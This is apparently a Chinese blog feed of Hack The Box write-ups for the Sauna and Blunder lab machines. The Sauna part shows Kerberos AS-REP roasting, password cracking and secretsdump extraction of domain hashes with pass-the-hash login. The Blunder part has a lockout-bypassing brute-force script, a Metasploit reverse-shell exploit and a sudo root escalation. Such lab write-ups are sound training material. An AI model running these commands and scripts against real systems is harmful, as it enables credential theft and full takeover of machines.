10.10.10.175Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 20:09 EDTNmap scan report for bogon (10.10.10.175)Host is up (0.25s latency).Not shown: 988 filtered portsPORT     STATE SERVICE53/tcp   open  domain80/tcp   open  http88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap| ldap-brute: |   root:<empty> => Valid credentials|   admin:<empty> => Valid credentials|   administrator:<empty> => Valid credentials|   webadmin:<empty> => Valid credentials|   sysadmin:<empty> => Valid credentials|   netadmin:<empty> => Valid credentials|   guest:<empty> => Valid credentials|   user:<empty> => Valid credentials|   web:<empty> => Valid credentials|_  test:<empty> => Valid credentials| ldap-rootdse: | LDAP Results|   <ROOT>|       domainFunctionality: 7|       forestFunctionality: 7|       domainControllerFunctionality: 7|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL|       isGlobalCatalogReady: TRUE|       supportedSASLMechanisms: GSSAPI|       supportedSASLMechanisms: GSS-SPNEGO|       supportedSASLMechanisms: EXTERNAL|       supportedSASLMechanisms: DIGEST-MD5|       supportedLDAPVersion: 3|       supportedLDAPVersion: 2|       supportedLDAPPolicies: MaxPoolThreads|       supportedLDAPPolicies: MaxPercentDirSyncRequests|       supportedLDAPPolicies: MaxDatagramRecv|       supportedLDAPPolicies: MaxReceiveBuffer|       supportedLDAPPolicies: InitRecvTimeout|       supportedLDAPPolicies: MaxConnections|       supportedLDAPPolicies: MaxConnIdleTime|       supportedLDAPPolicies: MaxPageSize|       supportedLDAPPolicies: MaxBatchReturnMessages|       supportedLDAPPolicies: MaxQueryDuration|       supportedLDAPPolicies: MaxDirSyncDuration|       supportedLDAPPolicies: MaxTempTableSize|       supportedLDAPPolicies: MaxResultSetSize|       supportedLDAPPolicies: MinResultSets|       supportedLDAPPolicies: MaxResultSetsPerConn|       supportedLDAPPolicies: MaxNotificationPerConn|       supportedLDAPPolicies: MaxValRange|       supportedLDAPPolicies: MaxValRangeTransitive|       supportedLDAPPolicies: ThreadMemoryLimit|       supportedLDAPPolicies: SystemMemoryLimitPercent|       supportedControl: 1.2.840.113556.1.4.319|       supportedControl: 1.2.840.113556.1.4.801|       supportedControl: 1.2.840.113556.1.4.473|       supportedControl: 1.2.840.113556.1.4.528|       supportedControl: 1.2.840.113556.1.4.417|       supportedControl: 1.2.840.113556.1.4.619|       supportedControl: 1.2.840.113556.1.4.841|       supportedControl: 1.2.840.113556.1.4.529|       supportedControl: 1.2.840.113556.1.4.805|       supportedControl: 1.2.840.113556.1.4.521|       supportedControl: 1.2.840.113556.1.4.970|       supportedControl: 1.2.840.113556.1.4.1338|       supportedControl: 1.2.840.113556.1.4.474|       supportedControl: 1.2.840.113556.1.4.1339|       supportedControl: 1.2.840.113556.1.4.1340|       supportedControl: 1.2.840.113556.1.4.1413|       supportedControl: 2.16.840.1.113730.3.4.9|       supportedControl: 2.16.840.1.113730.3.4.10|       supportedControl: 1.2.840.113556.1.4.1504|       supportedControl: 1.2.840.113556.1.4.1852|       supportedControl: 1.2.840.113556.1.4.802|       supportedControl: 1.2.840.113556.1.4.1907|       supportedControl: 1.2.840.113556.1.4.1948|       supportedControl: 1.2.840.113556.1.4.1974|       supportedControl: 1.2.840.113556.1.4.1341|       supportedControl: 1.2.840.113556.1.4.2026|       supportedControl: 1.2.840.113556.1.4.2064|       supportedControl: 1.2.840.113556.1.4.2065|       supportedControl: 1.2.840.113556.1.4.2066|       supportedControl: 1.2.840.113556.1.4.2090|       supportedControl: 1.2.840.113556.1.4.2205|       supportedControl: 1.2.840.113556.1.4.2204|       supportedControl: 1.2.840.113556.1.4.2206|       supportedControl: 1.2.840.113556.1.4.2211|       supportedControl: 1.2.840.113556.1.4.2239|       supportedControl: 1.2.840.113556.1.4.2255|       supportedControl: 1.2.840.113556.1.4.2256|       supportedControl: 1.2.840.113556.1.4.2309|       supportedControl: 1.2.840.113556.1.4.2330|       supportedControl: 1.2.840.113556.1.4.2354|       supportedCapabilities: 1.2.840.113556.1.4.800|       supportedCapabilities: 1.2.840.113556.1.4.1670|       supportedCapabilities: 1.2.840.113556.1.4.1791|       supportedCapabilities: 1.2.840.113556.1.4.1935|       supportedCapabilities: 1.2.840.113556.1.4.2080|       supportedCapabilities: 1.2.840.113556.1.4.2237|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL|       isSynchronized: TRUE|       highestCommittedUSN: 74465|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL|       currentTime: 20200627071405.0Z|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL| ldap-search: |   Context: DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL|         objectClass: top|         objectClass: domain|         objectClass: domainDNS|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL|         instanceType: 5|         whenCreated: 2020/01/23 05:44:25 UTC|         whenChanged: 2020/06/27 05:37:41 UTC|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         uSNCreated: 4099|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC|         uSNChanged: 53269|         name: EGOTISTICAL-BANK|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00$l\x07\x15\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC   \xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00|         creationTime: 132377098613445844|         forceLogoff: -9223372036854775808|         lockoutDuration: -18000000000|         lockOutObservationWindow: -18000000000|         lockoutThreshold: 0|         maxPwdAge: -36288000000000|         minPwdAge: -864000000000|         minPwdLength: 7|         modifiedCountAtLastProm: 0|         nextRid: 1000|         pwdProperties: 1|         pwdHistoryLength: 24|         objectSid: 1-5-21-2966785786-3096785034-1186376766|         serverState: 1|         uASCompat: 1|         modifiedCount: 1|         auditingPolicy: \x00\x01|         nTMixedDomain: 0|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         systemFlags: -1946157056|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         isCriticalSystemObject: TRUE|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]|         dSCorePropagationData: 1601/01/01 00:00:00 UTC|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         ms-DS-MachineAccountQuota: 10|         msDS-Behavior-Version: 7|         msDS-PerUserTrustQuota: 1|         msDS-AllUsersTrustQuota: 1000|         msDS-PerUserTrustTombstonesQuota: 10|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL|         msDS-NcType: 0|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE|         dc: EGOTISTICAL-BANK|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPsslService Info: Host: SAUNA; OS: WindowsNmap done: 1 IP address (1 host up) scanned in 22.50 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>枚举出了一些用户名，还有一个登陆凭证 </p><p><code>ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL</code></p><p>靶机所在的域，根域名是 <code>EGOTISTICAL-BANK.LOCAL</code>，脚本扫描显示域控也是这个，猜测靶机应该和域控是同一个机子，而这个机子上还虚拟化了其他的很多对象。</p><p><a href="https://github.com/ropnop/kerbrute/releases" target="_blank" rel="noopener">kerbrute</a> 枚举用户</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 sauna.txt     __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        Version: v1.0.3 (9dad6e1) - 06/26/20 - Ronnie Flathers @ropnop2020/06/26 20:22:17 >  Using KDC(s):2020/06/26 20:22:17 >   10.10.10.175:882020/06/26 20:22:17 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL2020/06/26 20:22:17 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL2020/06/26 20:22:17 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL2020/06/26 20:22:18 >  Done! Tested 50 usernames (4 valid) in 1.686 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>枚举出三个用户，尝试爆破用密码，没能成功</p><p>用 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py" target="_blank" rel="noopener">GetNPUsers.py</a> 抓取”不要求Kerberos预身份验证”的 hash</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ../../../sauna.txt -format john -outputfile Sauna -dc-ip 10.10.10.175<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20200627085630952.png" alt></p><blockquote><p>  JtR 解密</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ sudo john Sauna -wordlist=../../../rockyou.txt[sudo] password for kali: Using default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusThestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)1g 0:00:00:23 DONE (2020-06-26 20:58) 0.04299g/s 453095p/s 453095c/s 453095C/s Thing..Thehunter22Use the "--show" option to display all of the cracked passwords reliablySession completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  evil-winrm 连接</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ evil-winrm -u FSmith -p Thestrokes23 -i 10.10.10.175Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\FSmith\Documents> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  提权</p></blockquote><p>通过跑 winPEAS 发现了一个账户的密码</p><p><img src="image-20200627101104314.png" alt></p><p><img src="image-20200627102217085.png" alt></p><p>用 FSmith 没能提取出管理员的密码 hash</p><p>尝试用 svc_loanmgr 用户去提取，它看着也像个管理员…… <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a></p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~/Desktop/impacket/examples$ python3 secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/SVC_LOANMGR:"Moneymakestheworldgoround!"@10.10.10.175Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1f2ee4dfd42ee859114f2388599d7a4b:::[*] Cleaning up... kali@kali:~/Desktop/impacket/examples$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功获取管理员 hash 值，登陆</p><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ evil-winrm -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i 10.10.10.175Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackThebox </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blunder</title>
      <link href="/2020/06/21/blunder/"/>
      <url>/2020/06/21/blunder/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  nmap</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap 10.10.10.191Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 23:53 EDTNmap scan report for bogon (10.10.10.191)Host is up (0.24s latency).Not shown: 998 filtered portsPORT   STATE  SERVICE21/tcp closed ftp80/tcp open   httpNmap done: 1 IP address (1 host up) scanned in 15.28 secondskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  dirb 扫到一个后台和 一个有用的 txt文件</p></blockquote><p><img src="image-20200621115614009.png" alt></p><p><img src="image-20200621120343835.png" alt></p><p>猜测获取到了用户名</p><blockquote><p>  cewl 生成字典</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ cewl http://10.10.10.191 -w blunder.txtCeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>抓包发现有一个token会随着表单一起提交</p><p>写爆破脚本，远程搭建了一个 bludit 对登陆成功的数据包做分析，登陆成功的数据包会返回一个 Loction 字段</p><p><img src="image-20200621120918628.png" alt> </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://10.10.10.191/admin/login'</span>username <span class="token operator">=</span> <span class="token string">'fergus'</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'blunder.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    passwd <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(passwd)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> passwd<span class="token punctuation">:</span>    password <span class="token operator">=</span> p<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>     header <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'</span><span class="token punctuation">,</span>        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://10.10.10.191/admin/login'</span>    <span class="token punctuation">}</span>       session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    get_res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    csrf_token <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'name="tokenCSRF".+?value="(.+?)"'</span><span class="token punctuation">,</span>get_res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(csrf_token)</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span>            <span class="token string">'tokenCSRF'</span><span class="token punctuation">:</span>csrf_token<span class="token punctuation">,</span>            <span class="token string">'save'</span><span class="token punctuation">:</span><span class="token string">''</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#print(data,end='')</span>    post_res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>allow_redirects <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(post_res.headers)</span>    <span class="token keyword">if</span> <span class="token string">'Location'</span> <span class="token keyword">in</span> post_res<span class="token punctuation">.</span>headers<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\033[1;33m password:\033[0m'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">' trying...'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20200621122319295.png" alt></p><p>有了用户名和密码，直接用 msf getshell</p><pre class="line-numbers language-shell"><code class="language-shell">msf5 > search bluditMatching Modules================   #  Name                                          Disclosure Date  Rank       Check  Description   -  ----                                          ---------------  ----       -----  -----------   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerabilitymsf5 > use exploit/linux/http/bludit_upload_images_execmsf5 exploit(linux/http/bludit_upload_images_exec) > optionsModule options (exploit/linux/http/bludit_upload_images_exec):   Name        Current Setting  Required  Description   ----        ---------------  --------  -----------   BLUDITPASS  RolandDeschain   yes       The password for Bludit   BLUDITUSER  fergus           yes       The username for Bludit   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'   RPORT       80               yes       The target port (TCP)   SSL         false            no        Negotiate SSL/TLS for outgoing connections   TARGETURI                    yes       The base path for Bludit   VHOST                        no        HTTP server virtual hostPayload options (php/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.15.38      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Bludit v3.9.2msf5 exploit(linux/http/bludit_upload_images_exec) ><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell"># 在一个目录下找到用户名和密码www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.phpcat users.php<?php defined('BLUDIT') or die('Bludit CMS.'); ?>{    "admin": {        "nickname": "Hugo",        "firstName": "Hugo",        "lastName": "",        "role": "User",        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",        "email": "",        "registered": "2019-11-27 07:40:55",        "tokenRemember": "",        "tokenAuth": "b380cb62057e9da47afce66b4615107d",        "tokenAuthTTL": "2009-03-15 14:00",        "twitter": "",        "facebook": "",        "instagram": "",        "codepen": "",        "linkedin": "",        "github": "",        "gitlab": ""}}www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  hash-identifier 探测加密</p></blockquote><p><img src="image-20200621123229784.png" alt></p><p><strong><a href="![image-20200621123734126](C:\Users\ALing\AppData\Roaming\Typora\typora-user-images\image-20200621123734126.png)">解密</a></strong></p><p><img src="image-20200621123807516.png" alt></p><blockquote><p>  切换用户提权</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugosu hugoPassword: Password120hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cdcdhugo@blunder:~$ sudo -lsudo -lPassword: Password120Matching Defaults entries for hugo on blunder:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser hugo may run the following commands on blunder:    (ALL, !root) /bin/bashhugo@blunder:~$ sud hugo@blunder:sudo -u#-1 /bin/bashsudo -u#-1 /bin/bashroot@blunder:/home/hugo# ididuid=0(root) gid=1001(hugo) groups=1001(hugo)root@blunder:/home/hugo# <span aria-hidden="true" 